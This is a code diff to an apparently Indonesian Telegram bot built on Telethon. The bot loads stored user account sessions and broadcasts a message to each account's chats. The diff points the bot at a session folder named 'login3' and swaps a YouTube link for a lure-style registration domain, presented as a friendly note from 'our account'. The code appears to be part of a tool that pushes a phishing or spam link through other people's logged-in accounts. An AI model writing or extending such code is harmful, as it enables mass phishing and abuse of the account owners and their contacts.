@@ -9,7 +9,7 @@ from telethon.tl.functions.contacts import GetContactsRequest
 from telethon.tl.types import User, UserStatusOffline, UserStatusRecently
 
 # Folder tempat session disimpan
-SESSION_FOLDER = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'broadcast'))
+SESSION_FOLDER = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'login3'))
 
 async def broadcast_via_dialog_handler(update: Update, context: ContextTypes.DEFAULT_TYPE, phone_number: str, mode: str = "all"):
     query = update.callback_query
@@ -30,7 +30,7 @@ async def broadcast_via_dialog_handler(update: Update, context: ContextTypes.DEF
     )
 
     pesan_broadcast = "📢 Hai, ini adalah pesan dari akun kami. Semoga harimu menyenangkan!\n\n" \
-                      "Klik di sini untuk mengunjungi website kami: [Kunjungi Website](https://www.youtube.com/watch?v=2vHziVI2cOk)"
+                      "Klik di sini untuk mengunjungi website kami: [Kunjungi Website](https://daftar.update-share2025.my.id/)"
 
     client = TelegramClient(session_path, context.bot_data['api_id'], context.bot_data['api_hash'])
     await client.connect()
